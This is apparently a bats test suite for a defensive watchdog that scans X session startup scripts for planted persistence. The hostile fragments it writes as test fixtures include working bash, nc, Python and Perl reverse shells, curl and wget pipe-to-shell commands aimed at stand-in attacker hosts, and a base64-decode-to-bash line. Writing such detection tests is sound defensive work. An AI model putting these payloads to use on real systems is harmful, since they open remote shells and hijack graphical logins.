#!/usr/bin/env bats
# L2 bats functional tests for the xsession-watchdog scan script.
#
# The display manager SOURCES the scripts in /etc/X11/Xsession.d (and
# xinit/xinitrc.d) plus the top-level Xsession files AS THE LOGGING-IN USER
# on every graphical login — a per-graphical-login exec surface. A planted
# fragment that is world-writable / non-root-owned, or contains a command-
# injection pattern, is alert (T1546).
#
# Run with: bats packaging/test/L2-xsession-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/xsession-watchdog/systemd/xsession-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    HOOKD="${TMP}/Xsession.d"; mkdir -p "${HOOKD}"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_XSESSION_PROFILE="${PROFILE:-report}" \
    SELFDEF_XSESSION_BASELINE="${BASELINE}" \
    SELFDEF_XSESSION_DIRS="${DIRS_V:-$HOOKD}" \
    SELFDEF_XSESSION_FILES="${TMP}/no-extra-file" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

seed_benign() {
    printf '#!/bin/sh\n# 90benign\nexport LANG="$LANG"\n' > "${HOOKD}/90benign"
}

@test "no xsession fragments → ok / no_xsession" {
    DIRS_V="${TMP}/empty" run_wd
    cap | grep -q '"event":"no_xsession"'
    cap | grep -q '"severity":"ok"'
}

@test "benign fragment, first run → ok / baseline_initial" {
    seed_benign
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged fragments on second run → ok / xsession_intact" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"xsession_intact"'
    cap | grep -q '"severity":"ok"'
}

@test "a fragment with an injection pattern → alert / xsession_suspicious" {
    seed_benign
    run_wd
    printf '#!/bin/sh\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n' > "${HOOKD}/90benign"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"xsession_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "a world-writable fragment → alert" {
    seed_benign
    run_wd
    chmod 0666 "${HOOKD}/90benign"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a benign fragment change → warn / xsession_changed" {
    seed_benign
    run_wd
    printf '#!/bin/sh\n# 90benign updated\nexport LANG="${LANG:-C}"\n' > "${HOOKD}/90benign"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"event":"xsession_changed"'
    cap | grep -q '"severity":"warn"'
}

@test "a benign root-owned fragment is NOT flagged" {
    seed_benign
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    seed_benign
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious fragment" {
    seed_benign
    run_wd
    printf '#!/bin/sh\ncurl http://evil/p|sh\n' > "${HOOKD}/90benign"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}

@test "baseline is chmod 0600 (confidentiality — Xsession.d inventory enumerates per-graphical-login exec surface)" {
    seed_benign
    run_wd
    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
}

@test "INVARIANT (reverse-shell pattern): /dev/tcp reverse shell in xsession fragment → alert" {
    seed_benign
    run_wd
    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${HOOKD}/90benign"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (wget-pipe-sh): wget bootstrap variant in xsession fragment → alert" {
    seed_benign
    run_wd
    printf '#!/bin/sh\nwget -qO- http://attacker/p | sh\n' > "${HOOKD}/90benign"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (base64-decode-pipe): obfuscation variant in xsession fragment → alert" {
    seed_benign
    run_wd
    printf '#!/bin/sh\necho YmFzaCAtaQ== | base64 -d | bash\n' > "${HOOKD}/90benign"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (group-writable xsession fragment): group-writable → alert above world-writable bar" {
    seed_benign
    run_wd
    chmod 0664 "${HOOKD}/90benign"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (pre-existing world-writable xsession fragment): baseline_initial fires alert at install-time" {
    seed_benign
    chmod 0666 "${HOOKD}/90benign"
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "DELTA detect — ADDED fragment (attacker drops a new Xsession.d fragment) surfaces in sample" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\necho "new"\n' > "${HOOKD}/99-distinctive-attacker"
    run_wd
    cap | grep -q 'distinctive-attacker'
}

@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
    seed_benign
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-xsession -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (no auto-trust): xsession-watchdog does NOT refresh baseline on injection detection — alert STAYS until operator updates" {
    seed_benign
    run_wd
    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${HOOKD}/90benign"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # first delta — alert
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # alert STAYS
    cap | grep -q '"event":"xsession_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (commented injection pattern NOT flagged: # prefix filtered)" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\n# 90benign\n# example attack: bash -i >& /dev/tcp/evil.com/4444 0>&1\nexport LANG="$LANG"\n' > "${HOOKD}/90benign"
    run_wd
    ! cap | grep -q '"event":"xsession_suspicious"'
    ! cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (multi-dir scan: /etc/X11/Xsession.d + /etc/X11/xinit/xinitrc.d axes — injection in ANY → alert)" {
    # The display manager sources from Xsession.d (X session start) and
    # xinit/xinitrc.d (xinit-based session start). Lock multi-dir axis.
    HOOKD2="${TMP}/xinitrc.d"; mkdir -p "${HOOKD2}"
    seed_benign
    DIRS_V="${HOOKD} ${HOOKD2}" run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${HOOKD2}/evil-xinit"
    DIRS_V="${HOOKD} ${HOOKD2}" run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected)" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\ncurl -s http://attacker.com/p | bash\n' > "${HOOKD}/90benign"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (nc reverse-shell variant in Xsession.d fragment: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
    # Sister to sshrc/csh-config/logrotate/systemd-power-hooks/
    # bash-completion/anacrontab/apt-hooks/boot-script/ca-certificates/
    # dhcpcd-hooks/display-manager-hooks/dnf-plugins/fail2ban-action/
    # grub-config/initramfs-hooks/kernel-install-hooks/motd-scripts/
    # needrestart-hooks/pm-utils-hooks/resolvconf-hooks nc reverse-
    # shell variant INVARIANTs across the brain. Lock the netcat axis
    # on the X-session-start root/user-exec persistence surface
    # (T1546 — Xsession.d fragments run AS THE LOGGING-IN USER on
    # every graphical login; on a single-user workstation that user
    # IS the operator with sudo access).
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\nnc -e /bin/sh 1.1.1.1 4444\n' > "${HOOKD}/90benign"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (python -c reverse-shell variant — interpreter-rev-shell axis on Xsession.d fragment surface)" {
    # Sister to many other watchdog's python interpreter-rev-shell
    # INVARIANTs across the brain. Beyond bash/sh/nc, attackers
    # reach for python -c 'import socket,os,pty' to dodge shell-
    # pattern detectors. Locks the python axis on the X-session-
    # start root/user-exec persistence surface (T1546 — Xsession.d
    # fragments run AS THE LOGGING-IN USER on every graphical
    # login; on a single-user workstation that user IS the
    # operator with sudo access).
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\npython -c "import socket,os,pty;s=socket.socket();s.connect((\\"1.1.1.1\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn(\\"/bin/sh\\")"\n' > "${HOOKD}/90benign"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (DELTA detect — ADDED distinctive-attacker-named Xsession.d fragment surfaces in sample for operator-triage routing)" {
    # Sister to many other watchdog DELTA-detect sample-naming
    # INVARIANTs across the brain. When an attacker drops a new
    # Xsession.d fragment (T1546 — X-session-start root/user-
    # exec persistence; Xsession.d fragments run AS THE
    # LOGGING-IN USER on every graphical login), the file name
    # MUST surface in the JSON sample so operator dashboard
    # routes triage to the right path.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\necho new\n' > "${HOOKD}/99-distinctive-attacker-xsession"
    chmod 0755 "${HOOKD}/99-distinctive-attacker-xsession"
    run_wd
    cap | grep -q 'distinctive-attacker-xsession'
}

@test "INVARIANT (perl -e reverse-shell variant — perl-interpreter-rev-shell axis on Xsession.d fragment surface)" {
    # Sister to nc / python -c / curl|bash / dev-tcp Xsession.d
    # variants. Perl on every Debian/Ubuntu desktop. Locks perl
    # axis on T1546 X-session-start per-graphical-login user-
    # exec persistence.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\nperl -e "use Socket;\\$i=\\"1.1.1.1\\";\\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\"tcp\\"));connect(S,sockaddr_in(\\$p,inet_aton(\\$i)));exec(\\"/bin/sh -i\\");"\n' > "${HOOKD}/90benign"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (exec-path under writable-root: Xsession.d fragment invoking binary from /tmp → alert)" {
    # Sister to brain-wide writable-root-exec INVARIANTs. T1546
    # X-session-start per-graphical-login user-exec — Xsession.d
    # fragments run AS user on every graphical session start.
    # Beyond inline rev-shell payloads, attackers stage benign-
    # looking fragments that invoke binary in writable-root.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\n/tmp/staged_payload\n' > "${HOOKD}/90benign"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (severity bounded vocabulary {ok,warn,alert} — operator dashboard parser contract on xsession surface)" {
    # Sister to brain-wide severity-bounded-vocabulary INVARIANTs.
    # The xsession-watchdog MUST only emit severity values from
    # the closed set {ok,warn,alert} — never custom values
    # (critical, error, fatal, notice, info). Operator dashboard
    # parsers branch on the literal severity string; an out-of-
    # set value silently falls through routing and the operator
    # never sees the T1546 X-session-start per-graphical-login
    # user-exec persistence alert. Locks parser contract on the
    # Xsession.d fragment detection surface.
    seed_benign
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # ok / baseline
    printf '#!/bin/sh\n/dev/tcp/1.1.1.1/4444\n' > "${HOOKD}/90benign"
    run_wd                                              # alert path
    # Every severity value emitted MUST be one of {ok,warn,alert}.
    bad=$(grep -oE '"severity":"[^"]+"' "${SELFDEF_TEST_LOGCAP}" | grep -vE '"severity":"(ok|warn|alert)"' || true)
    [ -z "${bad}" ]
}

@test "INVARIANT (no auto-delete: xsession-watchdog NEVER deletes Xsession.d fragments — surveillance not remediation)" {
    # Sister to brain-wide no-auto-delete / surveillance-not-
    # remediation INVARIANTs across L2 watchdog suites. The
    # xsession-watchdog DETECTS T1546 X-session-start per-
    # graphical-login user-exec persistence but MUST NEVER emit
    # rm/unlink commands to auto-clean the Xsession.d fragment.
    # The detected fragment may be operator-legitimate (custom
    # session keyring setup, ssh-agent activation, dbus-launch
    # wiring). Silent auto-delete would destroy operator
    # baseline state AND could break the X session entirely.
    # Surveillance, never remediation. Locks anti-data-loss
    # contract on the xsession surveillance substrate.
    seed_benign
    printf '#!/bin/sh\n/dev/tcp/1.1.1.1/4444\n' > "${HOOKD}/90benign"
    run_wd
    [ -f "${HOOKD}/90benign" ]
    ! grep -vE '^[[:space:]]*#' "${WD}" | grep -qE '^[^#]*find[[:space:]].*-delete'
    ! grep -vE '^[[:space:]]*#' "${WD}" | grep -qE '^[^#]*rm[[:space:]]+-rf?[[:space:]]+"?\$\{?(HOOKD|XSESSION|FILE|file)'
}

@test "INVARIANT (service unit declares Type=oneshot — timer-driven probe semantics)" {
    # Sister to brain-wide systemd Type=oneshot INVARIANT family.
    # xsession-watchdog runs ON the timer's scheduled fire —
    # scans /etc/X11/Xsession + Xsession.d for injection
    # patterns in session-init fragments, emits a verdict, then
    # exits. Type=simple would break timer OnUnitActiveSec
    # semantics. Locks oneshot-probe contract on the xsession-
    # watchdog substrate.
    svc="${BATS_TEST_DIRNAME}/../../modules/xsession-watchdog/systemd/selfdef-xsession.service"
    [ -f "${svc}" ]
    grep -qE '^Type=oneshot' "${svc}"
}

@test "INVARIANT (module.toml TOML-parseable — anti-malformed-manifest contract)" {
    # Sister to brain-wide module.toml TOML-parseable INVARIANT
    # family. xsession-watchdog manifest declares install + profile gating
    # the resolver enforces; malformed manifest wedges the
    # xsession-watchdog scanner baseline. Python's tomllib is the
    # canonical parser. Locks anti-malformed-manifest on the
    # xsession-watchdog substrate.
    mtoml="${BATS_TEST_DIRNAME}/../../modules/xsession-watchdog/module.toml"
    [ -f "${mtoml}" ]
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
assert data['name'] == 'xsession-watchdog', 'name mismatch'
assert 'version' in data, 'version missing'
assert 'install' in data, 'install missing'
"
}
